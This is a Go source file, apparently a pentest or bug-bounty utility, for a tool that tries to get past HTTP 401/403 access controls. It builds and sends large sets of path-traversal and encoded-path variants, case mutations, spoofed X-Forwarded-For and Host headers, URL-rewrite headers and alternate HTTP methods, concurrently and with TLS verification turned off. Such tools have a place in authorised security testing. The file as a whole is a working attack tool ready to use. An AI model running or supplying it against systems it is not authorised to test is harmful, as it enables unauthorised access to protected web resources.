package main

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"sort"
	"strings"
	"sync"
	"time"
)

// Técnicas
const (
	DDS     = "dds"
	ENC     = "enc"
	QUICK   = "quick"
	CASE    = "case"
	HEADRS  = "headers" // técnica: cabeçalhos para bypass
	REWRITE = "rewrite" // técnica: rewrite de URL via cabeçalho
	METHOD  = "method"  // técnica: testar diferentes métodos HTTP
	ALL     = "all"     // técnica: todos os modos combinados
)

// Response holds the result of a single request.
type Response struct {
	URL        string
	StatusCode int
	BodyLength int
	ExtraInfo  string
}

// Payload representa uma requisição a ser testada, com URL, método, cabeçalhos extras e info extra.
type Payload struct {
	URL          string
	ExtraHeaders map[string]string
	Method       string
	ExtraInfo    string
}

// Config holds user-provided settings.
type Config struct {
	URLs        []string // A list of target URLs
	Techniques  []string // Técnicas a usar
	Headers     []string // Cabeçalhos customizados (passados via -H)
	Concurrency int      // Número de requisições concorrentes
	Timeout     int      // Timeout HTTP (segundos)
	OutputFile  string   // Arquivo de saída (opcional)
	Verbose     bool     // Modo verbose: mostra resultados em tempo real
	All         bool     // Se true, testa todas as URLs mesmo que o check inicial não retorne 401/403

	// Parâmetros novos:
	Layer int  // Camada para aplicar modificações (1-indexado). Se 0, usa a última camada.
	Full  bool // Se true, aplica modificações a todas as camadas.
}

// multiFlag allows multiple -H flags.
type multiFlag []string

func (f *multiFlag) String() string {
	return strings.Join(*f, ", ")
}

func (f *multiFlag) Set(value string) error {
	*f = append(*f, value)
	return nil
}

func main() {
	// Define flags
	singleURL := flag.String("u", "", "URL alvo única (deixe em branco para ler do stdin)")
	technique := flag.String("t", "", "Técnica de bypass: dds, enc, quick, case, headers, rewrite, method, all (se não setado, usa dds, enc, quick e case)")
	layer := flag.Int("l", 0, "Camada para aplicar modificações (1-indexado). Se não informado, usa a última camada.")
	fullFlag := flag.Bool("full", false, "Aplica modificações a todas as camadas")
	var headers multiFlag
	flag.Var(&headers, "H", "Cabeçalho(s) customizado(s) no formato 'Name: Value' (pode ser usado múltiplas vezes)")
	concurrency := flag.Int("c", 10, "Número de requisições concorrentes")
	timeout := flag.Int("timeout", 10, "Timeout (segundos)")
	output := flag.String("o", "", "Arquivo de saída (opcional)")
	verbose := flag.Bool("v", false, "Modo verbose: mostra resultados em tempo real")
	allFlag := flag.Bool("all", false, "Testa todas as URLs mesmo que o check inicial não retorne 401/403")
	flag.Parse()

	// Build the Config
	config := Config{
		Headers:     headers,
		Concurrency: *concurrency,
		Timeout:     *timeout,
		OutputFile:  *output,
		Verbose:     *verbose,
		All:         *allFlag,
		Layer:       *layer,
		Full:        *fullFlag,
	}

	// Se -t não for especificado, usa dds, enc, quick e case.
	if *technique == "" {
		config.Techniques = []string{DDS, ENC, QUICK, CASE}
	} else {
		config.Techniques = []string{*technique}
	}

	var urls []string
	if *singleURL != "" {
		urls = append(urls, *singleURL)
	} else {
		scanner := bufio.NewScanner(os.Stdin)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line != "" {
				urls = append(urls, line)
			}
		}
		if err := scanner.Err(); err != nil {
			fmt.Fprintf(os.Stderr, "Erro ao ler stdin: %v\n", err)
			os.Exit(1)
		}
	}
	if len(urls) == 0 {
		fmt.Println("Nenhuma URL alvo fornecida. Use -u ou forneça via stdin.")
		os.Exit(1)
	}
	config.URLs = urls

	// Filtra URLs (se não -all, mantém somente as que retornam 401/403)
	toTest := filterByInitialCheck(config)

	// Gera os payloads para cada URL e técnica
	allPayloads := buildAllRequests(config, toTest)
	if len(allPayloads) == 0 {
		fmt.Println("Nenhuma requisição gerada. Verifique suas URLs ou técnicas.")
		os.Exit(0)
	}

	// Executa os testes com concorrência
	results := runTests(allPayloads, config)

	// Ordena os resultados por BodyLength antes de mostrar a saída
	sort.Slice(results, func(i, j int) bool {
		return results[i].BodyLength < results[j].BodyLength
	})

	// Imprime os resultados no formato:
	// URL - Status: X - Length: Y - ExtraInfo (se houver)
	if !config.Verbose {
		printAllResults(results, config)
	}
}

// filterByInitialCheck realiza um GET simples em cada URL e mantém somente as que retornam 401 ou 403 (exceto se -all estiver setado).
func filterByInitialCheck(cfg Config) []string {
	if cfg.All {
		return cfg.URLs
	}
	var keep []string
	client := &http.Client{
		Timeout: time.Duration(cfg.Timeout) * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	for _, rawURL := range cfg.URLs {
		resp, err := client.Get(rawURL)
		if err != nil {
			continue
		}
		_ = resp.Body.Close()
		if resp.StatusCode == http.StatusUnauthorized || resp.StatusCode == http.StatusForbidden {
			keep = append(keep, rawURL)
		}
	}
	return keep
}

// buildAllRequests gera todos os payloads para cada URL e técnica.
func buildAllRequests(config Config, baseURLs []string) []Payload {
	var allPayloads []Payload
	for _, base := range baseURLs {
		parsed, err := url.Parse(base)
		if err != nil {
			fmt.Fprintf(os.Stderr, "URL inválida, ignorando: %s (erro: %v)\n", base, err)
			continue
		}
		for _, tech := range config.Techniques {
			var payloads []Payload
			switch tech {
			case DDS:
				payloads = wrapPayloads(generateDDSPayloads(parsed, config.Layer, config.Full), "")
			case ENC:
				payloads = wrapPayloads(generateEncodingPayloads(parsed, config.Layer, config.Full), "")
			case QUICK:
				payloads = wrapPayloads(generateQuickPayloads(parsed), "")
			case CASE:
				payloads = wrapPayloads(generateCasePayloads(parsed, config.Layer, config.Full), "")
			case HEADRS:
				payloads = generateHeadersPayloads(parsed)
			case REWRITE:
				payloads = generateRewritePayloads(parsed)
			case METHOD:
				payloads = generateMethodPayloads(parsed)
			case ALL:
				// Combina todas as técnicas
				payloadsDDS := wrapPayloads(generateDDSPayloads(parsed, config.Layer, config.Full), "")
				payloadsENC := wrapPayloads(generateEncodingPayloads(parsed, config.Layer, config.Full), "")
				payloadsQUICK := wrapPayloads(generateQuickPayloads(parsed), "")
				payloadsCASE := wrapPayloads(generateCasePayloads(parsed, config.Layer, config.Full), "")
				payloadsHEADRS := generateHeadersPayloads(parsed)
				payloadsREWRITE := generateRewritePayloads(parsed)
				payloadsMETHOD := generateMethodPayloads(parsed)
				payloads = append(payloads, payloadsDDS...)
				payloads = append(payloads, payloadsENC...)
				payloads = append(payloads, payloadsQUICK...)
				payloads = append(payloads, payloadsCASE...)
				payloads = append(payloads, payloadsHEADRS...)
				payloads = append(payloads, payloadsREWRITE...)
				payloads = append(payloads, payloadsMETHOD...)
			}
			allPayloads = append(allPayloads, payloads...)
		}
	}
	return removeDuplicatePayloads(allPayloads)
}

// wrapPayloads converte um slice de string para um slice de Payload.
func wrapPayloads(urls []string, extra string) []Payload {
	var payloads []Payload
	for _, u := range urls {
		payloads = append(payloads, Payload{
			URL:          u,
			ExtraHeaders: map[string]string{},
			Method:       "GET",
			ExtraInfo:    extra,
		})
	}
	return payloads
}

// removeDuplicatePayloads remove duplicatas (baseado em URL+ExtraInfo).
func removeDuplicatePayloads(pls []Payload) []Payload {
	seen := make(map[string]struct{})
	var result []Payload
	for _, p := range pls {
		key := p.URL + p.ExtraInfo
		if _, ok := seen[key]; !ok {
			seen[key] = struct{}{}
			result = append(result, p)
		}
	}
	return result
}

// runTests executa as requisições em paralelo utilizando os Payloads.
func runTests(payloads []Payload, config Config) []Response {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		Transport: tr,
		Timeout:   time.Duration(config.Timeout) * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return nil
		},
	}
	resultsChan := make(chan Response, len(payloads))
	sem := make(chan struct{}, config.Concurrency)
	var wg sync.WaitGroup

	for _, p := range payloads {
		wg.Add(1)
		sem <- struct{}{}
		go func(pl Payload) {
			defer wg.Done()
			defer func() { <-sem }()
			method := pl.Method
			if method == "" {
				method = "GET"
			}
			req, err := http.NewRequest(method, pl.URL, nil)
			if err != nil {
				resultsChan <- Response{URL: pl.URL, StatusCode: 0, BodyLength: 0, ExtraInfo: pl.ExtraInfo}
				return
			}
			// Cabeçalhos padrão
			req.Header.Set("User-Agent", "Mozilla/5.0")
			req.Header.Set("Accept", "*/*")
			// Cabeçalhos customizados do config
			for _, h := range config.Headers {
				parts := strings.SplitN(h, ":", 2)
				if len(parts) == 2 {
					req.Header.Set(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
				}
			}
			// Cabeçalhos extras do payload
			for k, v := range pl.ExtraHeaders {
				req.Header.Set(k, v)
			}
			resp, err := client.Do(req)
			if err != nil {
				resultsChan <- Response{URL: pl.URL, StatusCode: 0, BodyLength: 0, ExtraInfo: pl.ExtraInfo}
				return
			}
			defer resp.Body.Close()
			body, err := io.ReadAll(resp.Body)
			if err != nil {
				resultsChan <- Response{URL: pl.URL, StatusCode: 0, BodyLength: 0, ExtraInfo: pl.ExtraInfo}
				return
			}
			resultsChan <- Response{
				URL:        pl.URL,
				StatusCode: resp.StatusCode,
				BodyLength: len(body),
				ExtraInfo:  pl.ExtraInfo,
			}
		}(p)
	}
	go func() {
		wg.Wait()
		close(resultsChan)
	}()
	var results []Response
	if config.Verbose {
		writer := bufio.NewWriter(os.Stdout)
		for r := range resultsChan {
			results = append(results, r)
			printResponse(writer, r)
		}
		writer.Flush()
	} else {
		for r := range resultsChan {
			results = append(results, r)
		}
	}
	return results
}

// printResponse formata e imprime uma Response.
func printResponse(writer *bufio.Writer, r Response) {
	if r.ExtraInfo != "" {
		line := fmt.Sprintf("%s - Status: %d - Length: %d - %s", r.URL, r.StatusCode, r.BodyLength, r.ExtraInfo)
		writer.WriteString(colorizeLine(line, r.StatusCode) + "\n")
	} else {
		line := fmt.Sprintf("%s - Status: %d - Length: %d", r.URL, r.StatusCode, r.BodyLength)
		writer.WriteString(colorizeLine(line, r.StatusCode) + "\n")
	}
}

// printAllResults exibe os resultados, opcionalmente salvando-os em um arquivo.
func printAllResults(results []Response, config Config) {
	var file *os.File
	var err error
	if config.OutputFile != "" {
		file, err = os.Create(config.OutputFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Erro ao criar arquivo de saída: %v\n", err)
			os.Exit(1)
		}
		defer file.Close()
	}
	writer := bufio.NewWriter(os.Stdout)
	for _, res := range results {
		printResponse(writer, res)
		if file != nil {
			var line string
			if res.ExtraInfo != "" {
				line = fmt.Sprintf("%s - Status: %d - Length: %d - %s\n", res.URL, res.StatusCode, res.BodyLength, res.ExtraInfo)
			} else {
				line = fmt.Sprintf("%s - Status: %d - Length: %d\n", res.URL, res.StatusCode, res.BodyLength)
			}
			_, _ = file.WriteString(line)
		}
	}
	writer.Flush()
}

// ================== Funções de Geração de Payloads ==================

func generateDDSPayloads(parsedURL *url.URL, layer int, full bool) []string {
	var payloads []string
	path := parsedURL.Path
	if strings.HasPrefix(path, "/") {
		path = path[1:]
	}
	pathParts := strings.Split(path, "/")
	base := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)
	variations := []string{
		"..//", "./", ".././", ".../", "..../", ".;/", "..;/", "..;", ";",
		"%2e%2e/", "%2e%2e%2f", "..%2f", "..%2F", ".%2e/", "%2e./",
		"%252e%252e/", "%252e%252e%252f", "..//", "..\\", "..%5c", "..%255c",
		"..%c0%af", "%2e%2e%c0%af", "%252e%252e%c0%af", "..%c1%9c",
		"..%00/", "..%0d/", "..%0a/", "..%ff/", "%2e%2e%5c", "%2e/", "%3f",
		"%26", "%23", "%2c", "%7c", "%2e%2e%2f%2e%2e%2f",
		"%2f..%2f..", "%5c..%5c..", "....//", "..//..", "....//..//..",
		"./..//", "%u221e", "%u002e%u002e", "....", "..%2e/",
		".%00./", ".%0d./", ".%0a./", ".%2e./", ".%2f./", ".\\/",
		"%u2215", "%uff0f", "%c0%af", "%252f", "%5c", "%2f",
		"..\\.\\", "....\\", "..\\..\\",
	}
	if full {
		for i := 0; i < len(pathParts); i++ {
			currentPath := strings.Join(pathParts[:i+1], "/")
			for _, v := range variations {
				payloads = append(payloads, fmt.Sprintf("%s/%s%s", base, currentPath, v))
				mod := make([]string, len(pathParts[:i+1]))
				copy(mod, pathParts[:i+1])
				mod[i] = v + mod[i]
				payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(mod, "/")))
			}
		}
		for _, v := range variations {
			for i := 1; i < len(pathParts); i++ {
				mod := make([]string, len(pathParts))
				copy(mod, pathParts)
				mod[i] = v + mod[i]
				payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(mod, "/")))
			}
		}
		semicolonCombos := generateSemicolonCombinations(pathParts)
		for _, combo := range semicolonCombos {
			payloads = append(payloads, fmt.Sprintf("%s/%s", base, combo))
		}
		if len(pathParts) >= 2 {
			semicolonPatterns := generateMultipleSemicolonPatterns(pathParts)
			for _, pattern := range semicolonPatterns {
				payloads = append(payloads, fmt.Sprintf("%s/%s", base, pattern))
			}
		}
	} else {
		var targetIndex int
		if layer > 0 && layer <= len(pathParts) {
			targetIndex = layer - 1
		} else {
			targetIndex = len(pathParts) - 1
		}
		currentPath := strings.Join(pathParts[:targetIndex+1], "/")
		for _, v := range variations {
			payloads = append(payloads, fmt.Sprintf("%s/%s%s", base, currentPath, v))
			mod := make([]string, len(pathParts[:targetIndex+1]))
			copy(mod, pathParts[:targetIndex+1])
			mod[targetIndex] = v + mod[targetIndex]
			payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(mod, "/")))
		}
		if targetIndex > 0 {
			for _, v := range variations {
				mod := make([]string, len(pathParts))
				copy(mod, pathParts)
				mod[targetIndex] = v + mod[targetIndex]
				payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(mod, "/")))
			}
		}
		if pathParts[targetIndex] != "" {
			mod := make([]string, len(pathParts))
			copy(mod, pathParts)
			mod[targetIndex] = ";"
			payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(mod, "/")))
		}
		{
			parts := make([]string, len(pathParts))
			copy(parts, pathParts)
			combinations := []string{
				";" + parts[targetIndex],
				parts[targetIndex] + ";",
				";",
			}
			for _, combo := range combinations {
				parts[targetIndex] = combo
				payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(parts, "/")))
			}
		}
		semicolonPatterns := generateMultipleSemicolonPatterns(pathParts)
		for _, pattern := range semicolonPatterns {
			parts := strings.Split(pattern, "/")
			if targetIndex < len(parts) && strings.Contains(parts[targetIndex], ";") {
				payloads = append(payloads, fmt.Sprintf("%s/%s", base, pattern))
			}
		}
	}
	if parsedURL.RawQuery != "" {
		for i := range payloads {
			payloads[i] = fmt.Sprintf("%s?%s", payloads[i], parsedURL.RawQuery)
		}
	}
	return payloads
}

func generateEncodingPayloads(parsedURL *url.URL, layer int, full bool) []string {
	var payloads []string
	path := parsedURL.Path
	if strings.HasPrefix(path, "/") {
		path = path[1:]
	}
	pathParts := strings.Split(path, "/")
	base := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)
	encodedPath := url.PathEscape(path)
	payloads = append(payloads, fmt.Sprintf("%s/%s", base, encodedPath))
	doubleEncodedPath := url.PathEscape(encodedPath)
	payloads = append(payloads, fmt.Sprintf("%s/%s", base, doubleEncodedPath))
	b64Path := base64.StdEncoding.EncodeToString([]byte(path))
	payloads = append(payloads, fmt.Sprintf("%s/%s", base, b64Path))
	b64URLPath := base64.URLEncoding.EncodeToString([]byte(path))
	payloads = append(payloads, fmt.Sprintf("%s/%s", base, b64URLPath))
	var indices []int
	if full {
		for i := range pathParts {
			indices = append(indices, i)
		}
	} else {
		var targetIndex int
		if layer > 0 && layer <= len(pathParts) {
			targetIndex = layer - 1
		} else {
			targetIndex = len(pathParts) - 1
		}
		indices = []int{targetIndex}
	}
	for _, i := range indices {
		fullEncs := generateFullEncodings(pathParts[i])
		for _, fe := range fullEncs {
			modified := make([]string, len(pathParts))
			copy(modified, pathParts)
			modified[i] = fe
			payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(modified, "/")))
		}
		cbc := generateCharByCharEncodings(pathParts[i])
		for _, cbcVariant := range cbc {
			modified := make([]string, len(pathParts))
			copy(modified, pathParts)
			modified[i] = cbcVariant
			payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(modified, "/")))
		}
		if pathParts[i] != "" {
			var b64Chars []string
			for _, char := range pathParts[i] {
				b64Chars = append(b64Chars, base64.StdEncoding.EncodeToString([]byte(string(char))))
			}
			modified := make([]string, len(pathParts))
			copy(modified, pathParts)
			modified[i] = strings.Join(b64Chars, "")
			payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(modified, "/")))
		}
		encodingFuncs := []func(string) string{
			url.PathEscape,
			func(s string) string { return url.PathEscape(url.PathEscape(s)) },
			func(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) },
			func(s string) string { return base64.URLEncoding.EncodeToString([]byte(s)) },
		}
		for _, encFunc := range encodingFuncs {
			modified := make([]string, len(pathParts))
			copy(modified, pathParts)
			modified[i] = encFunc(pathParts[i])
			payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(modified, "/")))
		}
	}
	if parsedURL.RawQuery != "" {
		for i := range payloads {
			payloads[i] = fmt.Sprintf("%s?%s", payloads[i], parsedURL.RawQuery)
		}
	}
	return payloads
}

func generateQuickPayloads(parsedURL *url.URL) []string {
	var payloads []string
	path := parsedURL.Path
	if strings.HasPrefix(path, "/") {
		path = path[1:]
	}
	base := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)
	quickPayloads := []string{
		"//" + path,
		"/./" + path,
		"/.///" + path,
		"/.%2f" + path,
		"/;/" + path,
		"/.;/" + path,
		"//;" + path,
		"/%2f/" + path,
		"/./" + path + "/.",
		"//" + path + "//",
		"/" + path + "//",
		"/" + path + "/./",
		"/" + path + "%20",
		"/" + path + "%09",
		"/" + path + "%00",
		"/" + path + "..;/",
		"/" + path + "/;/",
		"/" + path + "//;/",
		"/" + path + "/./;/",
		"/%2e/" + path,
		"/%252e/" + path,
		"/%252e%252e/" + path,
		"/%2f/" + path,
		"/%2f%2f/" + path,
		"/%2f;" + path,
		"/%3b/" + path,
		"/%23/" + path,
		"/%2e%2e/" + path,
		"/..%2f" + path,
		"/%2f..%2f" + path,
	}
	for _, payload := range quickPayloads {
		payloads = append(payloads, base+payload)
	}
	if parsedURL.RawQuery != "" {
		for i, p := range payloads {
			payloads[i] = fmt.Sprintf("%s?%s", p, parsedURL.RawQuery)
		}
	}
	return payloads
}

func generateCasePayloads(parsedURL *url.URL, layer int, full bool) []string {
	var payloads []string
	path := parsedURL.Path
	if strings.HasPrefix(path, "/") {
		path = path[1:]
	}
	pathParts := strings.Split(path, "/")
	base := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)
	var indices []int
	if full {
		for i := range pathParts {
			indices = append(indices, i)
		}
	} else {
		var targetIndex int
		if layer > 0 && layer <= len(pathParts) {
			targetIndex = layer - 1
		} else {
			targetIndex = len(pathParts) - 1
		}
		indices = []int{targetIndex}
	}
	for _, i := range indices {
		if pathParts[i] == "" {
			continue
		}
		variations := []string{
			strings.ToUpper(pathParts[i]),
			strings.ToLower(pathParts[i]),
			strings.Title(strings.ToLower(pathParts[i])),
		}
		if len(pathParts[i]) > 1 {
			variations = append(variations,
				strings.ToUpper(string(pathParts[i][0]))+pathParts[i][1:],
				strings.ToLower(string(pathParts[i][0]))+pathParts[i][1:],
			)
		}
		mixed := ""
		for j, char := range pathParts[i] {
			if j%2 == 0 {
				mixed += strings.ToUpper(string(char))
			} else {
				mixed += strings.ToLower(string(char))
			}
		}
		variations = append(variations, mixed)
		for _, variation := range variations {
			modified := make([]string, len(pathParts))
			copy(modified, pathParts)
			modified[i] = variation
			payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(modified, "/")))
		}
	}
	if parsedURL.RawQuery != "" {
		for i := range payloads {
			payloads[i] = fmt.Sprintf("%s?%s", payloads[i], parsedURL.RawQuery)
		}
	}
	return payloads
}

func generateHeadersPayloads(parsedURL *url.URL) []Payload {
	var payloads []Payload
	originalURL := parsedURL.String()
	headerSets := []map[string]string{
		{"X-Forwarded-For": "127.0.0.1"},
		{"X-Forwarded-For": "10.0.0.1"},
		{"X-Forwarded-For": "192.168.0.1"},
		{"X-Forwarded-For": "172.16.0.1"},
		{"X-Forwarded-For": "127.0.0.1, 10.0.0.1"},
		{"X-Real-IP": "127.0.0.1"},
		{"Host": "127.0.0.1"},
		{"Host": "10.0.0.1"},
		{"X-Forwarded-Host": "127.0.0.1"},
		{"X-Forwarded-Host": "10.0.0.1"},
		{"X-Client-Ip": "127.0.0.1"},
		{"X-Client-Ip": "10.0.0.1"},
	}
	for _, hs := range headerSets {
		var infoParts []string
		for k, v := range hs {
			infoParts = append(infoParts, fmt.Sprintf("%s: %s", k, v))
		}
		info := strings.Join(infoParts, ", ")
		payloads = append(payloads, Payload{
			URL:          originalURL,
			ExtraHeaders: hs,
			Method:       "GET",
			ExtraInfo:    "Header: " + info,
		})
	}
	return payloads
}

func generateRewritePayloads(parsedURL *url.URL) []Payload {
	var payloads []Payload
	originalPath := parsedURL.Path
	baseURL := fmt.Sprintf("%s://%s/", parsedURL.Scheme, parsedURL.Host)
	rewriteHeaders := []string{"X-Rewrite-Url", "X-Original-URL", "X-Custom-URL", "X-Rewrite-URL"}
	for _, headerKey := range rewriteHeaders {
		payloads = append(payloads, Payload{
			URL:          baseURL,
			ExtraHeaders: map[string]string{headerKey: originalPath},
			Method:       "GET",
			ExtraInfo:    fmt.Sprintf("Header: %s: %s", headerKey, originalPath),
		})
	}
	return payloads
}

func generateMethodPayloads(parsedURL *url.URL) []Payload {
	var payloads []Payload
	originalURL := parsedURL.String()
	methods := []string{"GET", "POST", "PUT", "OPTIONS", "HEAD", "TRACE", "DEBUG"}
	for _, m := range methods {
		payloads = append(payloads, Payload{
			URL:          originalURL,
			ExtraHeaders: map[string]string{},
			Method:       m,
			ExtraInfo:    fmt.Sprintf("Method: %s", m),
		})
	}
	return payloads
}

func generateMultipleSemicolonPatterns(pathParts []string) []string {
	var patterns []string
	for i := 0; i < len(pathParts)-1; i++ {
		parts := make([]string, len(pathParts))
		copy(parts, pathParts)
		parts[i] = parts[i] + ";"
		patterns = append(patterns, strings.Join(parts, "/"))
	}
	parts := make([]string, len(pathParts))
	copy(parts, pathParts)
	parts[len(parts)-1] = parts[len(parts)-1] + ";"
	patterns = append(patterns, strings.Join(parts, "/"))
	for i := 1; i < len(pathParts); i++ {
		parts := make([]string, len(pathParts))
		copy(parts, pathParts)
		parts[i] = ";" + parts[i]
		patterns = append(patterns, strings.Join(parts, "/"))
	}
	for i := 0; i < len(pathParts)-1; i++ {
		parts := make([]string, len(pathParts))
		copy(parts, pathParts)
		for j := 0; j <= i; j++ {
			parts[j] = parts[j] + ";"
		}
		patterns = append(patterns, strings.Join(parts, "/"))
	}
	for i := 0; i < len(pathParts); i++ {
		parts := make([]string, len(pathParts))
		copy(parts, pathParts)
		parts[i] = ";" + parts[i] + ";"
		patterns = append(patterns, strings.Join(parts, "/"))
	}
	return patterns
}

func generateSemicolonCombinations(pathParts []string) []string {
	var combinations []string
	for i := 0; i < len(pathParts); i++ {
		parts := make([]string, len(pathParts))
		copy(parts, pathParts)
		parts[i] = ";"
		combinations = append(combinations, strings.Join(parts, "/"))
	}
	for i := 0; i < len(pathParts); i++ {
		parts := make([]string, len(pathParts))
		copy(parts, pathParts)
		parts[i] = ";" + parts[i]
		combinations = append(combinations, strings.Join(parts, "/"))
	}
	for i := 0; i < len(pathParts); i++ {
		parts := make([]string, len(pathParts))
		copy(parts, pathParts)
		parts[i] = parts[i] + ";"
		combinations = append(combinations, strings.Join(parts, "/"))
	}
	return combinations
}

func generateFullEncodings(s string) []string {
	var encs []string
	encs = append(encs, s)
	single := url.QueryEscape(s)
	encs = append(encs, single)
	double := url.QueryEscape(single)
	encs = append(encs, double)
	b64Str := base64.StdEncoding.EncodeToString([]byte(s))
	encs = append(encs, b64Str)
	return encs
}

func generateCharByCharEncodings(s string) []string {
	var variants []string
	for i, r := range s {
		asciiVal := int(r)
		if asciiVal < 0 || asciiVal > 255 {
			continue
		}
		hex := fmt.Sprintf("%02x", asciiVal)
		new1 := s[:i] + `\x` + hex + s[i+1:]
		variants = append(variants, new1)
		new2 := s[:i] + `\u00` + hex + s[i+1:]
		variants = append(variants, new2)
		upperHex := strings.ToUpper(hex)
		new3 := s[:i] + "%" + upperHex + s[i+1:]
		variants = append(variants, new3)
	}
	return variants
}

func generateCasePermutations(s string) []string {
	var results []string
	length := len(s)
	total := 1 << length
	for mask := 0; mask < total; mask++ {
		var sb strings.Builder
		for i := 0; i < length; i++ {
			c := s[i]
			if (mask & (1 << i)) != 0 {
				sb.WriteByte(byte(strings.ToUpper(string(c))[0]))
			} else {
				sb.WriteByte(byte(strings.ToLower(string(c))[0]))
			}
		}
		results = append(results, sb.String())
	}
	return results
}

func colorizeLine(line string, status int) string {
	switch {
	case status >= 200 && status < 300:
		return "\033[32m" + line + "\033[0m"
	case status >= 300 && status < 400:
		return "\033[34m" + line + "\033[0m"
	case status == 401:
		return "\033[38;5;208m" + line + "\033[0m"
	case status == 403:
		return "\033[31m" + line + "\033[0m"
	case status == 404:
		return "\033[35m" + line + "\033[0m"
	case status >= 400 && status < 500:
		return "\033[33m" + line + "\033[0m"
	case status >= 500 && status < 600:
		return "\033[38;5;94m" + line + "\033[0m"
	default:
		return line
	}
}
